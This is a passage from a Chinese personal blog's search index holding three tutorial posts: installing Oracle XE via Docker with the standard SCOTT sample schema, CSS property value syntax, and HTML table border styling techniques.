<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
    
    <entry>
      <title><![CDATA[Mac下使用docker安装oracle]]></title>
      <url>/2017/04/15/Database/oracle_via_docker/</url>
      <content type="html"><![CDATA[<p>一直找不到好的方法在mac下使用oracle，偶然间发现docker可以配置oracle，于是乎就玩玩。<br><a id="more"></a></p>
<h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><p><a href="https://www.docker.com" target="_blank" rel="external">Docker官网</a><br>1、<code>docker images</code><br>可以查看已安装的镜像<br>2、<code>docker ps</code><br>可以查看当前运行中的容器<br>3、<code>docker ps -a</code><br>可以查看所有的容器<br>4、<code>docker rm -f container-name</code><br>删除docker中的容器<br>5、<code>docker rmi images-name</code><br>删除镜像<br>6、<code>docker cp foo.txt container-name:/foo.txt</code><br>将本地文件复制到容器中<br>7、<code>docker cp container-name:/foo.txt foo.txt</code><br>将容器中的文件复制到本地<br>8、<code>docker run --name container-name images-name</code><br>安装运行镜像<br>9、<code>docker start container-name</code><br>启动容器<br>10、<code>docker stop container-name</code><br>关闭容器</p>
<h2 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h2><p><a href="https://store.docker.com/community/images/wnameless/oracle-xe-11g" target="_blank" rel="external">Oracle</a><br>用docker run安装时记得取一个容器的名字。<br>用这个装好之后发现没有scott用户，也没用vim。<br>1、安装vim<br><code>apt-get install vim</code><br>2、进入oracle目录<br><code>cd /u01/app/oracle/product/11.2.0/xe/rdbms/admin</code><br>3、创建scott.sql文件<br><code>vim scott.sql</code><br>4、添加内容  </p>
<figure class="highlight dos"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div></pre></td><td class="code"><pre><div class="line"><span class="comment">Rem Copyright (c) 1990 by Oracle Corporation</span></div><div class="line"><span class="comment">Rem NAME</span></div><div class="line"><span class="comment">REM    UTLSAMPL.SQL</span></div><div class="line"><span class="comment">Rem  FUNCTION</span></div><div class="line"><span class="comment">Rem  NOTES</span></div><div class="line"><span class="comment">Rem  MODIFIED</span></div><div class="line"><span class="comment">Rem gdudey   06/28/95 -  Modified for desktop seed database</span></div><div class="line"><span class="comment">Rem glumpkin   10/21/92 -  Renamed from SQLBLD.SQL</span></div><div class="line"><span class="comment">Rem blinden   07/27/92 -  Added primary and foreign keys to EMP and DEPT</span></div><div class="line"><span class="comment">Rem rlim   04/29/91 -      change char to varchar2</span></div><div class="line"><span class="comment">Rem mmoore   04/08/91 -      use unlimited tablespace priv</span></div><div class="line"><span class="comment">Rem pritto   04/04/91 -      change SYSDATE to 13-JUL-87</span></div><div class="line"><span class="comment">Rem   Mendels 12/07/90 - bug 30123;add to_date calls so language independent</span></div><div class="line"><span class="comment">Rem</span></div><div class="line"><span class="comment">rem</span></div><div class="line"><span class="comment">rem $Header: utlsampl.sql 7020100.1 94/09/23 22:14:24 cli Generic&lt;base&gt; $ sqlbld.sql</span></div><div class="line"><span class="comment">rem</span></div><div class="line"><span class="built_in">SET</span> TERMOUT OFF</div><div class="line"><span class="built_in">SET</span> <span class="built_in">ECHO</span> OFF</div><div class="line"><span class="comment"></span></div><div class="line">rem CONGDON    Invoked in RDBMS at build time. 29-DEC-1988</div><div class="line"><span class="comment">rem OATES:     Created: 16-Feb-83</span></div><div class="line"></div><div class="line">GRANT CONNECT,RESOURCE,UNLIMITED TABLESPACE TO SCOTT IDENTIFIED BY TIGER;</div><div class="line">ALTER USER SCOTT DEFAULT TABLESPACE USERS;</div><div class="line">ALTER USER SCOTT TEMPORARY TABLESPACE TEMP;</div><div class="line">CONNECT SCOTT/TIGER</div><div class="line">DROP TABLE DEPT;</div><div class="line">CREATE TABLE DEPT</div><div class="line">       (DEPTNO NUMBER(<span class="number">2</span>) CONSTRAINT PK_DEPT PRIMARY KEY,</div><div class="line">DNAME VARCHAR2(<span class="number">14</span>) ,</div><div class="line">LOC VARCHAR2(<span class="number">13</span>) ) ;</div><div class="line">DROP TABLE EMP;</div><div class="line">CREATE TABLE EMP</div><div class="line">       (EMPNO NUMBER(<span class="number">4</span>) CONSTRAINT PK_EMP PRIMARY KEY,</div><div class="line">ENAME VARCHAR2(<span class="number">10</span>),</div><div class="line">JOB VARCHAR2(<span class="number">9</span>),</div><div class="line">MGR NUMBER(<span class="number">4</span>),</div><div class="line">HIREDATE <span class="built_in">DATE</span>,</div><div class="line">SAL NUMBER(<span class="number">7</span>,<span class="number">2</span>),</div><div class="line">COMM NUMBER(<span class="number">7</span>,<span class="number">2</span>),</div><div class="line">DEPTNO NUMBER(<span class="number">2</span>) CONSTRAINT FK_DEPTNO REFERENCES DEPT);</div><div class="line">INSERT INTO DEPT VALUES</div><div class="line">(<span class="number">10</span>,'ACCOUNTING','NEW YORK');</div><div class="line">INSERT INTO DEPT VALUES (<span class="number">20</span>,'RESEARCH','DALLAS');</div><div class="line">INSERT INTO DEPT VALUES</div><div class="line">(<span class="number">30</span>,'SALES','CHICAGO');</div><div class="line">INSERT INTO DEPT VALUES</div><div class="line">(<span class="number">40</span>,'OPERATIONS','BOSTON');</div><div class="line">INSERT INTO EMP VALUES</div><div class="line">(<span class="number">7369</span>,'SMITH','CLERK',<span class="number">7902</span>,to_date('<span class="number">17</span>-<span class="number">12</span>-<span class="number">1980</span>','dd-mm-yyyy'),<span class="number">800</span>,NULL,<span class="number">20</span>);</div><div class="line">INSERT INTO EMP VALUES</div><div class="line">(<span class="number">7499</span>,'ALLEN','SALESMAN',<span class="number">7698</span>,to_date('<span class="number">20</span>-<span class="number">2</span>-<span class="number">1981</span>','dd-mm-yyyy'),<span class="number">1600</span>,<span class="number">300</span>,<span class="number">30</span>);</div><div class="line">INSERT INTO EMP VALUES</div><div class="line">(<span class="number">7521</span>,'WARD','SALESMAN',<span class="number">7698</span>,to_date('<span class="number">22</span>-<span class="number">2</span>-<span class="number">1981</span>','dd-mm-yyyy'),<span class="number">1250</span>,<span class="number">500</span>,<span class="number">30</span>);</div><div class="line">INSERT INTO EMP VALUES</div><div class="line">(<span class="number">7566</span>,'JONES','MANAGER',<span class="number">7839</span>,to_date('<span class="number">2</span>-<span class="number">4</span>-<span class="number">1981</span>','dd-mm-yyyy'),<span class="number">2975</span>,NULL,<span class="number">20</span>);</div><div class="line">INSERT INTO EMP VALUES</div><div class="line">(<span class="number">7654</span>,'MARTIN','SALESMAN',<span class="number">7698</span>,to_date('<span class="number">28</span>-<span class="number">9</span>-<span class="number">1981</span>','dd-mm-yyyy'),<span class="number">1250</span>,<span class="number">1400</span>,<span class="number">30</span>);</div><div class="line">INSERT INTO EMP VALUES</div><div class="line">(<span class="number">7698</span>,'BLAKE','MANAGER',<span class="number">7839</span>,to_date('<span class="number">1</span>-<span class="number">5</span>-<span class="number">1981</span>','dd-mm-yyyy'),<span class="number">2850</span>,NULL,<span class="number">30</span>);</div><div class="line">INSERT INTO EMP VALUES</div><div class="line">(<span class="number">7782</span>,'CLARK','MANAGER',<span class="number">7839</span>,to_date('<span class="number">9</span>-<span class="number">6</span>-<span class="number">1981</span>','dd-mm-yyyy'),<span class="number">2450</span>,NULL,<span class="number">10</span>);</div><div class="line">INSERT INTO EMP VALUES</div><div class="line">(<span class="number">7788</span>,'SCOTT','ANALYST',<span class="number">7566</span>,to_date('<span class="number">13</span>-JUL-<span class="number">87</span>')-<span class="number">85</span>,<span class="number">3000</span>,NULL,<span class="number">20</span>);</div><div class="line">INSERT INTO EMP VALUES</div><div class="line">(<span class="number">7839</span>,'KING','PRESIDENT',NULL,to_date('<span class="number">17</span>-<span class="number">11</span>-<span class="number">1981</span>','dd-mm-yyyy'),<span class="number">5000</span>,NULL,<span class="number">10</span>);</div><div class="line">INSERT INTO EMP VALUES</div><div class="line">(<span class="number">7844</span>,'TURNER','SALESMAN',<span class="number">7698</span>,to_date('<span class="number">8</span>-<span class="number">9</span>-<span class="number">1981</span>','dd-mm-yyyy'),<span class="number">1500</span>,<span class="number">0</span>,<span class="number">30</span>);</div><div class="line">INSERT INTO EMP VALUES</div><div class="line">(<span class="number">7876</span>,'ADAMS','CLERK',<span class="number">7788</span>,to_date('<span class="number">13</span>-JUL-<span class="number">87</span>')-<span class="number">51</span>,<span class="number">1100</span>,NULL,<span class="number">20</span>);</div><div class="line">INSERT INTO EMP VALUES</div><div class="line">(<span class="number">7900</span>,'JAMES','CLERK',<span class="number">7698</span>,to_date('<span class="number">3</span>-<span class="number">12</span>-<span class="number">1981</span>','dd-mm-yyyy'),<span class="number">950</span>,NULL,<span class="number">30</span>);</div><div class="line">INSERT INTO EMP VALUES</div><div class="line">(<span class="number">7902</span>,'FORD','ANALYST',<span class="number">7566</span>,to_date('<span class="number">3</span>-<span class="number">12</span>-<span class="number">1981</span>','dd-mm-yyyy'),<span class="number">3000</span>,NULL,<span class="number">20</span>);</div><div class="line">INSERT INTO EMP VALUES</div><div class="line">(<span class="number">7934</span>,'MILLER','CLERK',<span class="number">7782</span>,to_date('<span class="number">23</span>-<span class="number">1</span>-<span class="number">1982</span>','dd-mm-yyyy'),<span class="number">1300</span>,NULL,<span class="number">10</span>);</div><div class="line">DROP TABLE BONUS;</div><div class="line">CREATE TABLE BONUS</div><div class="line">(</div><div class="line">ENAME VARCHAR2(<span class="number">10</span>) ,</div><div class="line">JOB VARCHAR2(<span class="number">9</span>)  ,</div><div class="line">SAL NUMBER,</div><div class="line">COMM NUMBER</div><div class="line">) ;</div><div class="line">DROP TABLE SALGRADE;</div><div class="line">CREATE TABLE SALGRADE</div><div class="line">      ( GRADE NUMBER,</div><div class="line">LOSAL NUMBER,</div><div class="line">HISAL NUMBER );</div><div class="line">INSERT INTO SALGRADE VALUES (<span class="number">1</span>,<span class="number">700</span>,<span class="number">1200</span>);</div><div class="line">INSERT INTO SALGRADE VALUES (<span class="number">2</span>,<span class="number">1201</span>,<span class="number">1400</span>);</div><div class="line">INSERT INTO SALGRADE VALUES (<span class="number">3</span>,<span class="number">1401</span>,<span class="number">2000</span>);</div><div class="line">INSERT INTO SALGRADE VALUES (<span class="number">4</span>,<span class="number">2001</span>,<span class="number">3000</span>);</div><div class="line">INSERT INTO SALGRADE VALUES (<span class="number">5</span>,<span class="number">3001</span>,<span class="number">9999</span>);</div><div class="line">COMMIT;</div><div class="line"></div><div class="line"><span class="built_in">SET</span> TERMOUT ON</div><div class="line"><span class="built_in">SET</span> <span class="built_in">ECHO</span> ON</div></pre></td></tr></table></figure>
<p>5、进入sqlplus  </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">sqlplus //输入sys/oracle</div><div class="line">@/u01/app/oracle/product/11.2.0/xe/rdbms/admin/scott.sql  //添加scott账户</div><div class="line"><span class="keyword">alter</span> <span class="keyword">user</span> scott <span class="keyword">identified</span> <span class="keyword">by</span> tiger;  //修改scott账号密码为tiger</div><div class="line"><span class="keyword">alter</span> <span class="keyword">user</span> scott <span class="keyword">account</span> <span class="keyword">unlock</span>;  //如果账户锁定，可以用来解锁scott账户</div><div class="line">conn scott/tiger //连接到scott账户</div></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Database </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Oracle </tag>
            
            <tag> Docker </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CSS属性值语法解析]]></title>
      <url>/2017/04/15/Front%20End/CSS%E5%B1%9E%E6%80%A7%E8%AF%AD%E6%B3%95/</url>
      <content type="html"><![CDATA[<p>margin: [ <length> | <percentage> | auto ]{1,4}<br>基本元素：<length>, <percentage>, auto<br>组合符号：[], |<br>数量符号：{1,4}<br><a id="more"></a></percentage></length></percentage></length></p>
<h2 id="基本元素"><a href="#基本元素" class="headerlink" title="基本元素"></a>基本元素</h2><p>1、关键字</p>
<ul>
<li>auto  </li>
<li>solid  </li>
<li>bold  </li>
</ul>
<p>2、基本类型  </p>
<ul>
<li><code>&lt;length&gt;</code>: 1px、1em  </li>
<li><code>&lt;percentage&gt;</code>: 50%  </li>
<li><code>&lt;color&gt;</code>: #FFF000、rgb(0,0,0)  </li>
</ul>
<p>3、其他类型  </p>
<ul>
<li><code>&lt;&#39;padding-width&#39;&gt;</code>:可以是<code>&lt;length&gt;</code> 也可以是<code>&lt;percentage&gt;</code>  </li>
<li><code>&lt;color-stop&gt;</code>:<code>&lt;color&gt;</code>后面选择性跟<code>&lt;length&gt;</code>或<code>&lt;percentage&gt;</code>,也可以不跟. red 30%,green   </li>
</ul>
<p>4、符号  </p>
<ul>
<li>/  </li>
<li>,  </li>
</ul>
<p>5、其他(默认自带)  </p>
<ul>
<li><code>inherit</code>  </li>
<li><code>initial</code>  </li>
</ul>
<h2 id="组合符号"><a href="#组合符号" class="headerlink" title="组合符号"></a>组合符号</h2><p>1、空格（两项必存，顺序固定）<br><code>&lt;&#39;font-size&#39;&gt; &lt;&#39;font-family&#39;&gt;</code>  </p>
<ul>
<li>合法：12px arial  </li>
<li>不合法：arial 12px  </li>
</ul>
<p>2、&amp;&amp;（两项必存，顺序不定）<br><code>&lt;length&gt;&amp;&amp;&lt;color&gt;</code>  </p>
<ul>
<li>合法：red 12px  </li>
<li>不合法：red  </li>
</ul>
<p>3、||（至少一个，顺序不定）<br><code>underline || overline || line-through || blink</code>  </p>
<ul>
<li>合法：underline blink  </li>
<li>合法：underline  </li>
</ul>
<p>4、|（只选一个）<br><code>&lt;color&gt; | transparent</code>  </p>
<ul>
<li>合法：transparent  </li>
<li>不合法：red transparent  </li>
</ul>
<p>5、[]（分组，作为整体）<br><code>bold [thin || &lt;length&gt;]</code>  </p>
<ul>
<li>合法：bold thin  </li>
<li>合法：bold 12px  </li>
</ul>
<h2 id="数量符号"><a href="#数量符号" class="headerlink" title="数量符号"></a>数量符号</h2><p>1、无（只能出现一次）<br>2、+（一次或者多次）<br>3、？（表示可选）<br>4、{m，n}（出现m到n次）<br>5、*（出现0次或多次）<br>6、#（出现一次或多次，并以逗号分隔）  </p>
]]></content>
      
        <categories>
            
            <category> Front End </category>
            
        </categories>
        
        
        <tags>
            
            <tag> CSS </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[小玩意儿]]></title>
      <url>/2017/04/12/Front%20End/%E5%B0%8F%E7%8E%A9%E6%84%8F%E5%84%BF/</url>
      <content type="html"><![CDATA[<p>学习中的一些小技巧。<br><a id="more"></a></p>
<h2 id="表格边框设计"><a href="#表格边框设计" class="headerlink" title="表格边框设计"></a>表格边框设计</h2><p>1、table标签设置border=”0”，cellspacing=”1”，之后设置table，td(th)的背景颜色。  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></div><div class="line">  <span class="selector-tag">table</span> &#123;</div><div class="line">    <span class="attribute">background</span>: <span class="number">#bbb</span>;</div><div class="line">  &#125;</div><div class="line">  </div><div class="line">  <span class="selector-tag">td</span>,<span class="selector-tag">th</span> &#123;</div><div class="line">    <span class="attribute">background</span>: <span class="number">#bbb</span>;</div><div class="line">  &#125;</div><div class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">"0"</span> <span class="attr">cellspacing</span>=<span class="string">"1"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">caption</span>&gt;</span>运费详情<span class="tag">&lt;/<span class="name">caption</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">th</span>&gt;</span>区域<span class="tag">&lt;/<span class="name">th</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">th</span>&gt;</span>寄达地<span class="tag">&lt;/<span class="name">th</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">th</span>&gt;</span>首重（元/1000g）<span class="tag">&lt;/<span class="name">th</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">th</span>&gt;</span>续重（元/1000g）<span class="tag">&lt;/<span class="name">th</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">th</span> <span class="attr">rowspan</span>=<span class="string">"2"</span>&gt;</span>一区<span class="tag">&lt;/<span class="name">th</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>浙江、上海、江苏<span class="tag">&lt;/<span class="name">td</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>6<span class="tag">&lt;/<span class="name">td</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>1<span class="tag">&lt;/<span class="name">td</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>江西、安徽<span class="tag">&lt;/<span class="name">td</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>7<span class="tag">&lt;/<span class="name">td</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>1<span class="tag">&lt;/<span class="name">td</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">th</span>&gt;</span>二区<span class="tag">&lt;/<span class="name">th</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>吉林、黑龙江、云南<span class="tag">&lt;/<span class="name">td</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>10<span class="tag">&lt;/<span class="name">td</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>6<span class="tag">&lt;/<span class="name">td</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">th</span>&gt;</span>三区<span class="tag">&lt;/<span class="name">th</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>新疆、西藏<span class="tag">&lt;/<span class="name">td</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>15<span class="tag">&lt;/<span class="name">td</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>10<span class="tag">&lt;/<span class="name">td</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></div></pre></td></tr></table></figure>
<p>2、设置table的上左边框，之后设置td(th)的右下边框。  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></div><div class="line">  <span class="selector-tag">table</span> &#123;</div><div class="line">    <span class="attribute">border-top</span>:<span class="number">1px</span> solid <span class="number">#bbb</span>;</div><div class="line">    <span class="attribute">border-left</span>:<span class="number">1px</span> solid <span class="number">#bbb</span>;</div><div class="line">  &#125;</div><div class="line">  </div><div class="line">  <span class="selector-tag">td</span>,<span class="selector-tag">th</span> &#123;</div><div class="line">    <span class="attribute">border-right</span>:<span class="number">1px</span> solid <span class="number">#bbb</span>;</div><div class="line">    <span class="attribute">border-bottom</span>:<span class="number">1px</span> solid <span class="number">#bbb</span>; </div><div class="line">  &#125;</div><div class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">caption</span>&gt;</span>运费详情<span class="tag">&lt;/<span class="name">caption</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">th</span>&gt;</span>区域<span class="tag">&lt;/<span class="name">th</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">th</span>&gt;</span>寄达地<span class="tag">&lt;/<span class="name">th</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">th</span>&gt;</span>首重（元/1000g）<span class="tag">&lt;/<span class="name">th</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">th</span>&gt;</span>续重（元/1000g）<span class="tag">&lt;/<span class="name">th</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">th</span> <span class="attr">rowspan</span>=<span class="string">"2"</span>&gt;</span>一区<span class="tag">&lt;/<span class="name">th</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>浙江、上海、江苏<span class="tag">&lt;/<span class="name">td</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>6<span class="tag">&lt;/<span class="name">td</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>1<span class="tag">&lt;/<span class="name">td</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>江西、安徽<span class="tag">&lt;/<span class="name">td</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>7<span class="tag">&lt;/<span class="name">td</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>1<span class="tag">&lt;/<span class="name">td</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">th</span>&gt;</span>二区<span class="tag">&lt;/<span class="name">th</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>吉林、黑龙江、云南<span class="tag">&lt;/<span class="name">td</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>10<span class="tag">&lt;/<span class="name">td</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>6<span class="tag">&lt;/<span class="name">td</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">th</span>&gt;</span>三区<span class="tag">&lt;/<span class="name">th</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>新疆、西藏<span class="tag">&lt;/<span class="name">td</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>15<span class="tag">&lt;/<span class="name">td</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>10<span class="tag">&lt;/<span class="name">td</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">table</span>&gt;</span></div></pre></td></tr></table></figure>
<p>3、css设置border为none，border-collapse为collapse  </p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="css"></span></div><div class="line">  <span class="selector-tag">table</span> &#123;</div><div class="line">    <span class="attribute">border</span>: none;</div><div class="line">    <span class="attribute">border-collapse</span>: collapse;</div><div class="line">  &#125;</div><div class="line">  </div><div class="line">  <span class="selector-tag">td</span>,<span class="selector-tag">th</span> &#123;</div><div class="line">    <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#bbb</span>;</div><div class="line">  &#125;</div><div class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></div><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">table</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">caption</span>&gt;</span>运费详情<span class="tag">&lt;/<span class="name">caption</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">th</span>&gt;</span>区域<span class="tag">&lt;/<span class="name">th</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">th</span>&gt;</span>寄达地<span class="tag">&lt;/<span class="name">th</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">th</span>&gt;</span>首重（元/1000g）<span class="tag">&lt;/<span class="name">th</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">th</span>&gt;</span>续重（元/1000g）<span class="tag">&lt;/<span class="name">th</span>&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">th</span> <span class="attr">rowspan</span>=<span class="string">"2"</span>&gt;</span>一区<span class="tag">&lt;/<span class="name">th</span>&gt;</span></div><div class="line">      <span class="tag">&lt;<span class="name">td</span>&gt;</span>浙江、上海、江苏<span 